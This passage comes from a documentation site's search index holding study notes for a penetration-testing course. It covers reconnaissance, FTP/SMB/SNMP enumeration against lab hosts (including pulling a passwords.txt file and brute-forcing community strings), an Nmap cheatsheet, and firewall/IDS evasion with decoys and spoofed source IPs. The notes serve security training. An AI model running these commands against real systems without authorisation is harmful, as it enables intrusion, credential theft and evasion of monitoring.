The gathered data is analyzed to identify vulnerabilities in the system, such as outdated software, misconfigurations, or default credentials.</p> </li> <li> <p>Exploitation:     This phase involves attempting to exploit the identified vulnerabilities to gain unauthorized access or achieve specific objectives (e.g., privilege escalation or data extraction).</p> </li> <li> <p>Post-Exploitation:     Once access is gained, the tester assesses the extent of the breach's impact. This can include data exfiltration, persistent access, or understanding the business implications of the exploited vulnerabilities.</p> </li> <li> <p>Lateral Movement:     After gaining a foothold, the tester attempts to move laterally within the network to access other systems, gather more credentials, or escalate privileges further.</p> </li> <li> <p>Proof of Concept (PoC):     Evidence of successful exploitation is documented, often including screenshots, data dumps, or access logs, to demonstrate the vulnerabilities effectively to stakeholders.</p> </li> <li> <p>Post-Engagement:     This involves reporting the findings to the client. The report typically includes an executive summary, technical details, risk ratings, and recommendations for remediation. Debriefing sessions may also occur to ensure the client understands the risks and suggested fixes.</p> </li> <li> <p>Identifying Assets:     Uncover publicly accessible components of the target, including web pages, subdomains, IP addresses, and technologies in use. This step creates a comprehensive overview of the target's digital footprint.</p> </li> <li> <p>Discovering Hidden Information:     Locate inadvertently exposed sensitive data, such as backup files, configuration files, or internal documentation. These findings can provide valuable insights and potential attack vectors.</p> </li> <li> <p>Gathering Intelligence:     Collect information that could be useful for exploitation or social engineering, such as details about key personnel, email addresses, or behavioral patterns.</p> </li> </ol>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#the-primary-goal-of-a-web-reconnaissance-include","title":"The primary goal of a web reconnaissance include","text":""},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#information-gathering","title":"Information Gathering","text":""},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>Analyzing the Attack Surface:     Examine the target's attack surface by evaluating technologies, configurations, and possible entry points. This process aims to uncover vulnerabilities and weaknesses that could be exploited during the penetration test.</li> </ul>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#types-of-reconnaissance","title":"Types of Reconnaissance","text":"<p>Web reconnaissance is a critical step in the penetration testing process. It can be broadly categorized into two primary methodologies:</p>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#1-active-reconnaissance","title":"1. Active Reconnaissance","text":"<ul> <li>Definition:     Active reconnaissance involves directly interacting with the target system to gather information. This often includes sending packets, probing services, and analyzing responses.</li> <li>Techniques:<ul> <li>Port Scanning: Using tools like [[Nmap]] to identify open ports and active services.</li> <li>Web Application Scanning: Tools like Burp Suite or [[Nikto]] are used to identify vulnerabilities in web applications.</li> <li>DNS Enumeration: Actively querying DNS servers to discover subdomains and other records.</li> <li>Banner Grabbing: Capturing service banners to determine software versions.</li> </ul> </li> <li>Advantages:<ul> <li>Yields precise and detailed information.</li> <li>Helps identify live services and vulnerabilities effectively.</li> </ul> </li> <li>Challenges:<ul> <li>Risk of detection by security systems like IDS/IPS.</li> <li>May trigger alerts, exposing the tester\u2019s activities.</li> </ul> </li> </ul>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#2-passive-reconnaissance","title":"2. Passive Reconnaissance","text":"<ul> <li>Definition:     Passive reconnaissance gathers information without directly interacting with the target system. It relies on publicly accessible sources to avoid detection.</li> <li>Techniques:<ul> <li>OSINT (Open-Source Intelligence): Using resources like Shodan, WHOIS, or public databases to gather data.</li> <li>Social Media Analysis: Collecting information from platforms like LinkedIn or Twitter.</li> <li>Metadata Analysis: Extracting metadata from publicly available documents or images.</li> <li>Google Dorking: Utilizing advanced search operators to find sensitive information.</li> </ul> </li> <li>Advantages:<ul> <li>Difficult to detect, as no direct interaction with the target occurs.</li> <li>Provides useful contextual information, such as corporate structure or exposed credentials.</li> </ul> </li> <li>Challenges:<ul> <li>Limited in scope compared to active reconnaissance.</li> <li>May require more time and effort to find actionable data.</li> </ul> </li> </ul> <p>Choosing the Right Methodology: A successful reconnaissance strategy often blends active and passive techniques to balance information depth with stealth. While passive methods prioritize evasion, active reconnaissance allows for detailed technical insights critical for penetration testing.</p>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#active-reconnaissance","title":"Active Reconnaissance","text":"<p>In active reconnaissance, the attacker\u00a0<code>directly interacts with the target system</code>\u00a0to gather information. This interaction can take various forms:</p> Technique Description Example Tools Risk of Detection <code>Port Scanning</code> Identifying open ports and services running on the target. Using Nmap to scan a web server for open ports like 80 (HTTP) and 443 (HTTPS). Nmap, Masscan, Unicornscan High: Direct interaction with the target can trigger intrusion detection systems (IDS) and firewalls. <code>Vulnerability Scanning</code> Probing the target for known vulnerabilities, such as outdated software or misconfigurations. Running Nessus against a web application to check for SQL injection flaws or cross-site scripting (XSS) vulnerabilities. Nessus, OpenVAS, Nikto High: Vulnerability scanners send exploit payloads that security solutions can detect. <code>Network Mapping</code> Mapping the target's network topology, including connected devices and their relationships. Using traceroute to determine the path packets take to reach the target server, revealing potential network hops and infrastructure. Traceroute, Nmap Medium to High: Excessive or unusual network traffic can raise suspicion. <code>Banner Grabbing</code> Retrieving information from banners displayed by services running on the target. Connecting to a web server on port 80 and examining the HTTP banner to identify the web server software and version. Netcat, curl Low: Banner grabbing typically involves minimal interaction but can still be logged. <code>OS Fingerprinting</code> Identifying the operating system running on the target. Using Nmap's OS detection capabilities (<code>-O</code>) to determine if the target is running Windows, Linux, or another OS. Nmap, Xprobe2 Low: OS fingerprinting is usually passive, but some advanced techniques can be detected. <code>Service Enumeration</code> Determining the specific versions of services running on open ports. Using Nmap's service version detection (<code>-sV</code>) to determine if a web server is running Apache 2.4.50 or Nginx 1.18.0. Nmap Low: Similar to banner grabbing, service enumeration can be logged but is less likely to trigger alerts. <code>Web Spidering</code> Crawling the target website to identify web pages, directories, and files. Running a web crawler like Burp Suite Spider or OWASP ZAP Spider to map out the structure of a website and discover hidden resources. Burp Suite Spider, OWASP ZAP Spider, Scrapy (customisable) Low to Medium: Can be detected if the crawler's behaviour is not carefully configured to mimic legitimate traffic. <p>Active reconnaissance provides a direct and often more comprehensive view of the target's infrastructure and security posture. However, it also carries a higher risk of detection, as the interactions with the target can trigger alerts or raise suspicion.</p>"},{"location":"CPTS/Metasploit/Preface/","title":"Preface","text":""},{"location":"CPTS/Metasploit/Preface/#the-role-of-automated-tools-in-security-assessments","title":"The Role of Automated Tools in Security Assessments","text":"<ul> <li>Automated tools in the cybersecurity industry have sparked intense debate, with opinions ranging from skepticism about their value to strong support for their utility.</li> </ul>"},{"location":"CPTS/Metasploit/Preface/#arguments-against-automated-tools","title":"Arguments Against Automated Tools","text":"<ul> <li>Lack of Skill Development: Critics argue that reliance on tools undermines a security professional\u2019s ability to demonstrate hands-on expertise.</li> <li>Tunnel Vision: Over-reliance can narrow thinking, creating a dependency where users fail to think beyond the tool\u2019s capabilities.</li> <li>Potential Security Risks: Public disclosure of tools can empower malicious actors with limited knowledge to exploit vulnerabilities.</li> </ul>"},{"location":"CPTS/Metasploit/Preface/#arguments-supporting-automated-tools","title":"Arguments Supporting Automated Tools","text":"<ul> <li>Learning Aid: Tools can simplify the complex landscape of vulnerabilities, offering a user-friendly way for newcomers to learn.</li> <li>Efficiency: They save time, enabling professionals to focus on complex and nuanced aspects of an assessment.</li> <li>Community Knowledge: Publicly released tools, such as those from the NSA, contribute to the shared pool of security knowledge.</li> </ul>"},{"location":"CPTS/Metasploit/Preface/#conclusion","title":"Conclusion","text":"<p>While tools offer significant benefits in learning and efficiency, professionals must balance their use with skill development to avoid dependency. The ethical implications of tool disclosure should also be carefully considered, as these resources can empower both security professionals and malicious actors. The goal is to integrate automated tools effectively while fostering critical thinking and creativity in security assessments.</p>"},{"location":"CPTS/Metasploit/Preface/#the-role-of-discipline-in-security-assessments","title":"The Role of Discipline in Security Assessments","text":"<p>The information security industry operates in a rapidly evolving landscape of technologies, protocols, and systems. Discipline is a foundational element for success in this field, especially when faced with the constraints and challenges of modern assessments.</p>"},{"location":"CPTS/Metasploit/Preface/#key-points","title":"Key Points","text":"<ol> <li>Time Constraints<ul> <li>Comprehensive assessments are rarely feasible due to time limitations.</li> <li>Efforts should prioritize high-impact issues and quick-win remediations to align with customer expectations and deadlines.</li> </ul> </li> <li>Credibility Challenges<ul> <li>Even manual efforts or custom tools might not earn credibility from non-technical stakeholders.</li> <li>Clients prioritize tangible results delivered efficiently over technical accolades or methodologies.</li> </ul> </li> <li>Self-Validation Over External Validation<ul> <li>Professionals should focus on meeting personal standards of excellence rather than seeking approval from the infosec community.</li> <li>By prioritizing authentic goals, recognition from peers will naturally follow.</li> </ul> </li> </ol>"},{"location":"CPTS/Metasploit/Preface/#conclusion_1","title":"Conclusion","text":"<p>Discipline ensures security professionals stay focused on impactful work, prioritize effectively, and deliver value despite constraints. The ultimate goal is to provide actionable results, not to validate one\u2019s ego or compete for external validation.</p>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/","title":"Attacking Network Services","text":""},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#banner-grabbing","title":". Banner Grabbing","text":"<ul> <li>Purpose: Quickly fingerprint a service.</li> <li>Tools:<ul> <li> <p>Nmap:</p> <ul> <li> <p>Command: <code>nmap -sV --script=banner &lt;target&gt;</code></p> <ul> <li>Netcat (nc):</li> </ul> </li> <li> <p>Command: <code>nc -nv &lt;target_IP&gt; &lt;port&gt;</code></p> <ul> <li>Example:Output:</li> </ul> </li> </ul> <pre><code>nc -nv 10.129.42.253 21\n</code></pre> <pre><code>(UNKNOWN) [10.129.42.253] 21 (ftp) open\n220 (vsFTPd 3.0.3)\n</code></pre> </li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#2-service-scanning-with-nmap","title":"2. Service Scanning with Nmap","text":"<ul> <li> <p>Command for automating banner grabbing across a network:</p> <pre><code>nmap -sV --script=banner -p21 10.10.10.0/24\n</code></pre> <ul> <li>Explanation: This will scan all machines in the <code>10.10.10.0/24</code> subnet on port 21 (FTP), attempting to grab banners.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#ftp-file-transfer-protocol","title":"FTP (File Transfer Protocol)","text":"<ul> <li>Importance: Familiarity with FTP is crucial because it often contains interesting or sensitive data.</li> <li>Common Ports: FTP operates on port 21</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#1-nmap-scan-for-ftp","title":"1. Nmap Scan for FTP","text":"<ul> <li> <p>Command to scan for FTP (port 21):</p> <pre><code>nmap -sV -p21 &lt;target&gt;\n</code></pre> </li> <li> <p>Example:</p> <ul> <li>A scan reveals an installation of vsftpd 3.0.3.</li> </ul> <p>![[image.png]]</p> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#2-key-findings-in-ftp-scans","title":"2. Key Findings in FTP Scans","text":"<ul> <li> <p>Anonymous Authentication:</p> <ul> <li> <p>If enabled, anyone can log in without credentials.</p> </li> <li> <p>Example output indicating anonymous login:</p> <pre><code>220 (vsFTPd 3.0.3)\n</code></pre> </li> </ul> </li> <li> <p>Public Directory:</p> <ul> <li>A <code>pub</code> directory may be available, which could contain interesting or sensitive files.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#connection-to-ftp","title":"Connection to FTP","text":"<pre><code>ftp -p 10.129.42.253\n</code></pre> <p>![[image 1.png]]</p>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#ftp-common-commands-and-file-access","title":"FTP: Common Commands and File Access","text":"<ul> <li>FTP Shell Commands:<ul> <li><code>cd</code> \u2013 Change directory.</li> <li><code>ls</code> \u2013 List directory contents.</li> <li><code>get &lt;filename&gt;</code> \u2013 Download a file from the server.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#example","title":"Example:","text":"<pre><code>ftp&gt; cd pub\nftp&gt; ls\nftp&gt; get login.txt\n</code></pre> <ul> <li> <p>Inspecting Downloaded Files:</p> <ul> <li> <p>Command to view file contents (e.g., login.txt):</p> <pre><code>cat login.txt\n</code></pre> </li> <li> <p>The file might contain valuable information, such as credentials for further access.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#study-tip","title":"Study Tip:","text":"<ul> <li>Key Focus: Remember FTP\u2019s common commands and how to inspect downloaded files for potential access escalation (e.g., discovering credentials in files like <code>login.txt</code>).</li> <li>Practice: Set up an FTP server in a lab environment to practice using <code>cd</code>, <code>ls</code>, and <code>get</code> commands</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#smb-server-message-block","title":"SMB (Server Message Block)","text":"<ul> <li>Importance:<ul> <li>SMB is a common protocol on Windows machines, offering multiple attack vectors for vertical and lateral movement.</li> <li>Network file shares may contain sensitive data, such as credentials.</li> <li>Some SMB versions are vulnerable to Remote Code Execution (RCE) exploits like EternalBlue.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#1-nmap-smb-enumeration","title":"1. Nmap SMB Enumeration","text":"<ul> <li>Command to enumerate SMB OS information:</li> </ul> <pre><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40\n</code></pre> <p>Example Output:</p> <pre><code>PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows 7 Professional 7601 SP1\n|   Computer name: CEO-PC\n|   Workgroup: WORKGROUP\n</code></pre> <ul> <li>Reveals: OS version, computer name, and workgroup. This can help identify whether the target is vulnerable to exploits like EternalBlue.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#2-vulnerability-detection-eternalblue","title":"2. Vulnerability Detection (EternalBlue)","text":"<ul> <li>Further Enumeration: Use tools like Metasploit to check if the system is vulnerable to EternalBlue.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#3-advanced-nmap-smb-scanning","title":"3. Advanced Nmap SMB Scanning","text":"<ul> <li> <p>Command for advanced service and OS detection:</p> <pre><code>nmap -A -p445 &lt;target&gt;\nsudo nmap --script smb-os-discovery.nse -p445 &lt;target ip&gt;\n</code></pre> </li> <li> <p>Example Output:</p> </li> </ul> <pre><code>PORT    STATE SERVICE     VERSION\n445/tcp open  netbios-ssn Samba smbd 4.6.\n</code></pre> <ul> <li>Reveals: Version of Samba running, the OS, and additional network information (e.g., hostname).</li> <li>Host Script Results:<ul> <li>NetBIOS Information: Shows the NetBIOS name, which is useful for further enumeration.</li> <li>SMB2 Security Mode: Indicates whether message signing is enabled, which is a security feature.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#4-traceroute","title":"4. Traceroute","text":"<ul> <li> <p>Nmap also performs a traceroute to map the network path to the target:</p> <pre><code>TRACEROUTE (using port 445/tcp)\nHOP RTT       ADDRESS\n1   111.62 ms 10.10.14.1\n2   111.89 ms 10.129.42.253\n</code></pre> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#study-tips","title":"Study Tips:","text":"<ul> <li>Key Focus: Understand how to enumerate SMB with Nmap to detect OS versions, services, and potential vulnerabilities.</li> <li>Commands to Remember:<ul> <li><code>nmap --script smb-os-discovery.nse -p445 &lt;target&gt;</code> for SMB enumeration.</li> <li><code>nmap -A -p445 &lt;target&gt;</code> for advanced detection (OS, services, etc.).</li> </ul> </li> <li>Practice: Set up a vulnerable lab environment and run Nmap scans to practice identifying SMB vulnerabilities, like EternalBlue.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#smb-shares-enumeration-interaction","title":"SMB Shares Enumeration &amp; Interaction","text":"<ul> <li>Purpose: SMB allows for remote access to shared folders, which may contain sensitive information (e.g., passwords).</li> <li>Common Tools: <code>smbclient</code> is useful for enumerating and interacting with SMB shares.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#1-enumerating-smb-shares","title":"1. Enumerating SMB Shares","text":"<ul> <li> <p>Command to list shares without a password prompt:</p> <pre><code>smbclient -N -L \\\\\\\\\\\\\\\\&lt;target_ip&gt;\n</code></pre> <ul> <li><code>L</code> flag: Lists available shares.</li> <li><code>N</code> flag: Suppresses the password prompt.</li> <li>Example Output:</li> </ul> <pre><code>Sharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\nusers           Disk\nIPC$            IPC       IPC Service (Samba, Ubuntu\n</code></pre> <ul> <li>Key Insight: Shares like <code>users</code> might contain files with sensitive information, such as passwords.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#2-connecting-to-an-smb-share","title":"2. Connecting to an SMB Share","text":"<ul> <li> <p>Command to connect as a guest:</p> <pre><code>smbclient \\\\\\\\\\\\\\\\&lt;target_ip&gt;\\\\\\\\users\n</code></pre> <ul> <li>If access is denied (e.g., <code>NT_STATUS_ACCESS_DENIED</code>), credentials are required.</li> <li>Command to connect with user credentials (e.g., <code>bob:Welcome1</code>):</li> </ul> <pre><code>smbclient -U bob \\\\\\\\\\\\\\\\&lt;target_ip&gt;\\\\\\\\users\n</code></pre> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#3-interacting-with-smb-shares","title":"3. Interacting with SMB Shares","text":"<ul> <li> <p>Useful SMB commands once connected:</p> <ul> <li><code>ls</code> \u2013 List directory contents.</li> <li><code>cd &lt;directory&gt;</code> \u2013 Change directory.</li> <li><code>get &lt;filename&gt;</code> \u2013 Download a file.</li> <li>Example Commands:</li> </ul> <pre><code>smb: \\\\&gt; ls\nsmb: \\\\&gt; cd bob\nsmb: \\\\bob\\\\&gt; ls\n</code></pre> <ul> <li>In the example, we find a file named <code>passwords.txt</code>.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#4-downloading-files-from-smb-share","title":"4. Downloading Files from SMB Share","text":"<ul> <li> <p>Command to download a file:</p> <pre><code>smb: \\\\bob\\\\&gt; get passwords.txt\n</code></pre> <ul> <li>This downloads the file to the local machine.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#study-tips_1","title":"Study Tips:","text":"<ul> <li>Key Focus: Understand how to enumerate SMB shares using <code>smbclient</code> and how to interact with shares using commands like <code>ls</code>, <code>cd</code>, and <code>get</code>.</li> <li>Commands to Remember:<ul> <li><code>smbclient -N -L \\\\\\\\\\\\\\\\&lt;target_ip&gt;</code> to list shares.</li> <li><code>smbclient -U &lt;user&gt; \\\\\\\\\\\\\\\\&lt;target_ip&gt;\\\\\\\\&lt;share&gt;</code> to connect using credentials.</li> <li><code>ls</code>, <code>cd</code>, <code>get</code> for interacting with files.</li> </ul> </li> <li>Practice: Set up an SMB share and practice connecting, listing contents, and downloading files.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#snmp-simple-network-management-protocol","title":"SNMP (Simple Network Management Protocol)","text":"<ul> <li>Purpose: SNMP is used to gather information and statistics about devices such as routers. If community strings are known, they can provide access to valuable data.</li> <li>Vulnerability:<ul> <li>SNMP v1 and v2c: Uses plaintext community strings (default: <code>public</code> and <code>private</code>).</li> <li>SNMP v3: Introduced encryption and authentication for better security.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#1-snmp-community-strings","title":"1. SNMP Community Strings","text":"<ul> <li>Community Strings are like passwords for accessing SNMP data.</li> <li>Common defaults:<ul> <li>Public: For read-only access.</li> <li>Private: For read-write access.</li> </ul> </li> <li>Key Insight: Many devices still use default community strings, making them easy to exploit.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#2-snmp-enumeration-with-snmpwalk","title":"2. SNMP Enumeration with <code>snmpwalk</code>","text":"<ul> <li> <p>Command for SNMP enumeration using SNMP v2c:</p> <pre><code>snmpwalk -v 2c -c public &lt;target_ip&gt; 1.3.6.1.2.1.1.5.0\n</code></pre> <ul> <li><code>v 2c</code> specifies the version of SNMP.</li> <li><code>c public</code> specifies the community string (in this case, <code>public</code>).</li> <li><code>1.3.6.1.2.1.1.5.0</code> is the OID for the device name (example output: <code>\"gs-svcscan\"</code>).</li> <li>Example Output:</li> </ul> <pre><code>iso.3.6.1.2.1.1.5.0 = STRING: \"gs-svcscan\"\n</code></pre> </li> <li> <p>Error Handling:</p> <ul> <li> <p>If the community string is incorrect, you may receive a Timeout response:</p> <pre><code>snmpwalk -v 2c -c private &lt;target_ip&gt;\n</code></pre> </li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#3-brute-forcing-snmp-community-strings","title":"3. Brute Forcing SNMP Community Strings","text":"<ul> <li> <p>Tool: <code>onesixtyone</code> can be used to brute force community strings.</p> </li> <li> <p>Command to brute force community strings:</p> <pre><code>onesixtyone -c dict.txt &lt;target_ip&gt;\n</code></pre> <ul> <li><code>c dict.txt</code> specifies the dictionary file with common community strings.</li> <li>Output: If successful, it will reveal the community string and some system information.</li> <li>Example Output:</li> </ul> <pre><code>10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic\n</code></pre> </li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#4-key-information-revealed-by-snmp","title":"4. Key Information Revealed by SNMP","text":"<ul> <li>Process Parameters: May include credentials passed in command lines.</li> <li>Routing Information: Can reveal services bound to additional interfaces.</li> <li>Software Versioning: Can be used to identify potential vulnerabilities in the system.</li> </ul>"},{"location":"CPTS/Nmap/Attacking%20Network%20Services/#study-tips_2","title":"Study Tips:","text":"<ul> <li>Commands to Remember:<ul> <li><code>snmpwalk -v 2c -c public &lt;target_ip&gt; &lt;OID&gt;</code> for enumerating information.</li> <li><code>onesixtyone -c dict.txt &lt;target_ip&gt;</code> for brute forcing community strings.</li> </ul> </li> <li>Key Focus: Learn the OID tree structure to target specific information (e.g., device name, OS version).</li> <li>Practice: Set up SNMP on a test machine and practice both enumeration and brute forcing.</li> </ul>"},{"location":"CPTS/Nmap/Cheatsheet/","title":"Cheatsheet","text":""},{"location":"CPTS/Nmap/Cheatsheet/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>"},{"location":"CPTS/Nmap/Cheatsheet/#scanning-options","title":"Scanning Options","text":"Nmap Option Description <code>10.10.10.0/24</code> Target network range. <code>-sn</code> Disables port scanning. <code>-Pn</code> Disables ICMP Echo Requests <code>-n</code> Disables DNS Resolution. <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target. <code>--packet-trace</code> Shows all packets sent and received. <code>--reason</code> Displays the reason for a specific result. <code>--disable-arp-ping</code> Disables ARP Ping Requests. <code>--top-ports=&lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent. <code>-p-</code> Scan all ports. <code>-p22-110</code> Scan all ports between 22 and 110. <code>-p22,25</code> Scans only the specified ports 22 and 25. <code>-F</code> Scans top 100 ports. <code>-sS</code> Performs an TCP SYN-Scan. <code>-sA</code> Performs an TCP ACK-Scan. <code>-sU</code> Performs an UDP Scan. <code>-sV</code> Scans the discovered services for their versions. <code>-sC</code> Perform a Script Scan with scripts that are categorized as \"default\". <code>--script &lt;script&gt;</code> Performs a Script Scan by using the specified scripts. <code>-O</code> Performs an OS Detection Scan to determine the OS of the target. <code>-A</code> Performs OS Detection, Service Detection, and traceroute scans. <code>-D RND:5</code> Sets the number of random Decoys that will be used to scan the target. <code>-e</code> Specifies the network interface that is used for the scan. <code>-S 10.10.10.200</code> Specifies the source IP address for the scan. <code>-g</code> Specifies the source port for the scan. <code>--dns-server &lt;ns&gt;</code> DNS resolution is performed by using a specified name server."},{"location":"CPTS/Nmap/Cheatsheet/#output-options","title":"Output Options","text":"Nmap Option Description <code>-oA filename</code> Stores the results in all available formats starting with the name of \"filename\". <code>-oN filename</code> Stores the results in normal format with the name \"filename\". <code>-oG filename</code> Stores the results in \"grepable\" format with the name of \"filename\". <code>-oX filename</code> Stores the results in XML format with the name of \"filename\"."},{"location":"CPTS/Nmap/Cheatsheet/#performance-options","title":"Performance Options","text":"Nmap Option Description <code>--max-retries &lt;num&gt;</code> Sets the number of retries for scans of specific ports. <code>--stats-every=5s</code> Displays scan's status every 5 seconds. <code>-v/-vv</code> Displays verbose output during the scan. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout. <code>--min-rate 300</code> Sets the number of packets that will be sent simultaneously. <code>-T &lt;0-5&gt;</code> Specifies the specific timing template."},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/","title":"Firewall and IDS IPS Evasion","text":""},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#firewall-and-idsips-evasion-techniques","title":"Firewall and IDS/IPS Evasion Techniques","text":""},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#1-understanding-firewalls","title":"1. Understanding Firewalls","text":"<ul> <li>Purpose: Prevents unauthorized external connections.</li> <li>Operation: Uses rules to monitor network traffic and decide whether to pass, ignore, or block packets.</li> <li>Packet Actions:<ul> <li>Drop: Packet is ignored, no response from the host.</li> <li>Reject: Host responds with an RST flag or ICMP error.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#2-ids-vs-ips","title":"2. IDS vs. IPS","text":"<ul> <li>IDS (Intrusion Detection System):<ul> <li>Function: Monitors for potential attacks, analyzing and reporting detected threats.</li> <li>Detection Method: Pattern matching and signature analysis.</li> </ul> </li> <li>IPS (Intrusion Prevention System):<ul> <li>Function: Takes active measures against detected threats.</li> <li>Reaction: Blocks or modifies packets based on set rules.</li> </ul> </li> <li>Comparison to Firewalls: Unlike firewalls, IDS/IPS are passive and usually examine all traffic.</li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#3-identifying-firewalls-and-rules","title":"3. Identifying Firewalls and Rules","text":"<ul> <li>Filtered Ports: Could indicate firewall presence with specific rules.</li> <li>Response Types:<ul> <li>No response: Packet likely dropped.</li> <li>ICMP error/RST response: Indicates packet rejection.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#4-firewall-evasion-with-nmap","title":"4. Firewall Evasion with Nmap","text":"<ul> <li> <p>SYN Scan (-sS):</p> <ul> <li>Useful for checking open or closed status.</li> <li>Host responds with SYN-ACK for open ports, RST for closed.</li> <li> <p>ACK Scan (-sA):</p> </li> <li> <p>Bypasses some firewalls; only sends ACK packets.</p> </li> <li>Hosts respond with RST for both open and closed ports.</li> <li>Effective when SYN scans are blocked by firewalls.</li> <li>Example Command:</li> </ul> <pre><code>sudo nmap [target IP] -p [ports] -sS / -sA -Pn -n --disable-arp-ping --packet-trace\n</code></pre> </li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#5-detecting-idsips-systems","title":"5. Detecting IDS/IPS Systems","text":"<ul> <li>Active Detection: IDS only reports to admins, while IPS may block IPs.</li> <li>Testing:<ul> <li>Use a VPS; if it gets blocked, assume IPS presence.</li> <li>Switch to another IP if necessary, and reduce scan aggressiveness.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#6-decoys-for-obfuscation","title":"6. Decoys for Obfuscation","text":"<ul> <li> <p>Purpose: Hide the true source IP by adding random IPs as decoys.</p> </li> <li> <p>Usage:</p> <ul> <li>Use <code>-D</code> flag to add decoys; your real IP blends among others.</li> <li> <p>Example:</p> <p>```shell     sudo nmap [target IP] -p [ports] -sS -Pn -n --disable-arp-ping --packet-trace -D RND:[number of IPs] <pre><code>- **Considerations**: Not all decoy IPs are guaranteed to work, as ISPs may filter spoofed packets.\n\n\n#### 7. **Testing Firewall Rules with IP Manipulation**\n\n- **Purpose**: See if altering the source IP affects access to certain services.\n- **Commands**:\n    - Specifying Source IP: `-S [IP]`\n    - Operating System Detection: `-O` for guessing OS type.\n\n---\n#### **Common Commands**\n\n1. **TCP SYN Scan**:\n\n    ```shell\n    sudo nmap &lt;target-IP&gt; -p &lt;ports&gt; -sS -Pn -n --disable-arp-ping --packet-trace\n</code></pre></p> </li> </ul> <p>Description: Detects open ports by sending SYN packets. May trigger firewalls/IDS. 1. TCP ACK Scan:</p> <p><code>shell sudo nmap &lt;target-IP&gt; -p &lt;ports&gt; -sA -Pn -n --disable-arp-ping --packet-trace</code></p> <ul> <li>Description: Bypasses some firewall rules; uses only ACK flag, triggering less strict filtering.</li> </ul> </li> <li> <p>Decoy Scan:</p> <p>```shell sudo nmap  -p  -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 <pre><code>    - **Description**: Uses random IPs as decoys to mask the origin of the scan; helpful for evading IPS detection.\n\n3. **Operating System Detection**:\n\n\n    ```shell\n    sudo nmap &lt;target-IP&gt; -n -Pn -p445 -O\n    ```\n\n    - **Description**: OS detection scan with specified port; can test for firewall rules.\n4. **Specific Source IP (-S)**:\n\n    ```shell\n    sudo nmap &lt;target-IP&gt; -S &lt;spoofed-IP&gt; -p &lt;ports&gt; -Pn -n --packet-trace\n    ```\n\n    - **Description**: Masks actual IP by specifying a source IP, useful if certain subnets/IPs are blocked.\n\n#### **Flag Definitions**\n\n- `-Pn`: Disables ICMP Echo requests.\n- `-n`: Disables DNS resolution.\n- 